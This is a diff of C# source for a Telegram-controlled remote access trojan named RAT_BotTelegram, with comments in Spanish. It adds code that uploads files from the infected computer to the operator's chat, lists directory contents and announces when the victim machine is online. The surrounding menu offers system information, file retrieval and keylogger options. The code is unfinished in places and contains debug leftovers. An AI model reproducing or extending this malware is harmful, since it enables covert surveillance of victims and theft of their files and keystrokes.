@@ -3,6 +3,7 @@ using System;
 using System.Configuration;
 using System.IO;
 using System.Linq;
+using System.Net.Http;
 using System.Reflection;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading.Tasks;
@@ -16,7 +17,7 @@ namespace RAT_BotTelegram {
     class Program {
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TToken);
 
-       
+
 
         // Debes escribir el ID, para que el bot solo te responda a tí.
         static void Main(string[] args) {
@@ -32,10 +33,38 @@ namespace RAT_BotTelegram {
 
             //Método que se ejecuta cuando se recibe un error
             Bot.OnReceiveError += BotOnReceiveError;
+            string path = @"O:\OneDrive - xKx\Pictures\Gif\Windows logos.gif";
+
+
+
+            Bot.SendDocumentAsync(config.id, File.Open(path, FileMode.Open));
+
+
+
+            string GetTypeFile(string dir) {   // Retorna solo el nombre del archivo
+                             //string path = @"D:\PNG Icons\System Win 10\camera.png";
+                try {
+                    /* Utiliza la variable para obtener el ultimo contendor 
+                     * =Ejemplo:
+                     * [Antes]    path = @"Contenedor1\Contenedor2\Contenedor3" 
+                     * [Despues]  path =  "Contenedor3"                                                     */
+                    int palabraClave = dir.LastIndexOf(@"\");
+                    dir = dir.Substring(palabraClave + 1);
+                } catch {
+                    dir = "Hubo un problema"; // Hubo un problema 
+                }
+
+                return dir;  // NameFile
+            }
+            
+
+            //Bot.SendPhotoAsync(config.id, File.Open(path, FileMode.Open));
+            //Bot.SendVideoAsync(config.id, path);
+            
 
             // Mensaje de conexión
 
-            Bot.SendTextMessageAsync(config.id, "==>>    Computer: "+Features.getUserName()+" is online    <<== ");
+            Bot.SendTextMessageAsync(config.id, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");
 
 
             // Escucha servidor
@@ -126,11 +155,11 @@ namespace RAT_BotTelegram {
                             callbackData: "getDownload")
                     }});
 
-            //var GetFiles = new InlineKeyboardMarkup
+                    //var GetFiles = new InlineKeyboardMarkup
 
-            //await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
-            await Bot.SendTextMessageAsync(config.id, "Get files from?", replyMarkup: GetFiles);
-                   // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
+                    //await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
+                    await Bot.SendTextMessageAsync(config.id, "Get files from?", replyMarkup: GetFiles);
+                    // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
 
                     break;
                 //Mensaje por default
@@ -143,29 +172,132 @@ namespace RAT_BotTelegram {
                   "\n/Get_Information <get detailed system information>" +
                   "\n/Get_Files          |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                   "\n/Get_DirFiles    |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
-                  "\n/Keylogger       |Menu| <keylogger Options >" +  
+                  "\n/Keylogger       |Menu| <keylogger Options >" +
                   "\n" +
                   "\n" +
                   "\n" +
                   "";
-                    await Bot.SendTextMessageAsync(config.id,text: usage,replyMarkup: new ReplyKeyboardRemove());
+                    await Bot.SendTextMessageAsync(config.id, text: usage, replyMarkup: new ReplyKeyboardRemove());
                     break;
             }
         }
+
+       
+
+        public string getTypeFile(string File) {
+            String[] video  = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
+            String[] audio  = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
+            String[] doc    = { "doc", "docx", "txt", "log", "ppt", "pptx" };
+            String[] imagen = { "ico", "jpe", "jpe", "jpeg", "png", "bmp" };
+            String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
+                                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
+                                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
+                                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};
+
+            return ""; // Extension File
+        }
+
         private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
+            string GetFileName(string dir) {   // Retorna solo el nombre del archivo
+                                              //string path = @"D:\PNG Icons\System Win 10\camera.png";
+                try {
+                    /* Utiliza la variable para obtener el ultimo contendor 
+                     * =Ejemplo:
+                     * [Antes]    path = @"Contenedor1\Contenedor2\Contenedor3" 
+                     * [Despues]  path =  "Contenedor3"                                                     */
+                    int palabraClave = dir.LastIndexOf(@"\");
+                    dir = dir.Substring(palabraClave + 1);
+                } catch {
+                    dir = "Hubo un problema"; // Hubo un problema 
+                }
+
+                return dir;  // NameFile
+            }
+            string GetFileType(string File) {
+               string dir = GetFileName(File);
+                string resultado;   //Puede ser: [Video]-[Audio]-[Doc]-[Imagen]
+                bool final = false;     // True = Se encontró la caregoría de extensión // No se encoentró la categoría
+                try {
+                    /* Utiliza la variable para obtener el ultimo contendor 
+                     * =Ejemplo:
+                     * [Antes]    path = @"Contenedor1\Contenedor2\Contenedor3" 
+                     * [Despues]  path =  "Contenedor3"                                                     */
+                    int palabraClave = dir.LastIndexOf(".");
+                    dir = dir.Substring(palabraClave + 1);
+                } catch {
+                    return  "[-]";
+                }
+
+                String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
+                String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
+                String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx" };
+                String[] imagen = { "ico", "jpe", "jpe", "jpeg", "png", "bmp" };
+                //String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
+                //                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
+                //                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
+                //                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};
+
+                // Verifica si el archivo es una imagen
+                foreach (string ext in imagen) {
+                    if (ext == dir) {
+                        resultado = "[Imagen]";
+                        final = true;
+                        Console.WriteLine("");  // Solo debug
+                        break;
+                    }
+                    Console.WriteLine("");  // Solo degub
+                }
+                // Verifica si el archivo es una video 
+                if (!final) { // solo si no se encoentró la categoría
+                    foreach (string ext in video) {
+                        if (ext == dir) {
+                            resultado = "[Video]";
+                            final = true;
+                            break;
+                        }
+                    }
+                }
+
+
+
+
+
+
+
+                return dir; // Extension File
+            }
+
+            
+
+
+
+
+
+
+
             var callbackQuery = callbackQueryEventArgs.CallbackQuery;
- 
+
+            
+
             switch (callbackQuery.Data) {
-                
+
+
                 case "GetDocument":
+
+                    string ruta = @"O:\OneDrive - xKx\Pictures\Game resources - Sprites\Lazer o balas\transparent-laser-pixel.png";
+                    Console.WriteLine("Nombre: " + GetFileName(ruta) + "\n tipo:" + GetFileType(ruta));
+
                     await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
                     foreach (var file in Tools.GetFile(@"O:\Estoo")) {
-                        FileInfo info = new FileInfo(file);
-                        await Bot.SendTextMessageAsync(config.id, "<| "+file+info+" |>\n" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
+                        //FileInfo info = new FileInfo(file);
+                        //await Bot.SendTextMessageAsync(config.id, "<| " + file + info + " |>\n" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
+                        //await Bot.SendDocumentAsync(config.id, Telegram.Bot.Types.InputFiles.InputOnlineFile file);
+                       
+                        await Bot.SendTextMessageAsync(config.id, file);
+                        //await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open));
                     }
                     await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
                     break;
-
 
                 case "GetDocumenttgert":
                     await Bot.SendLocationAsync(
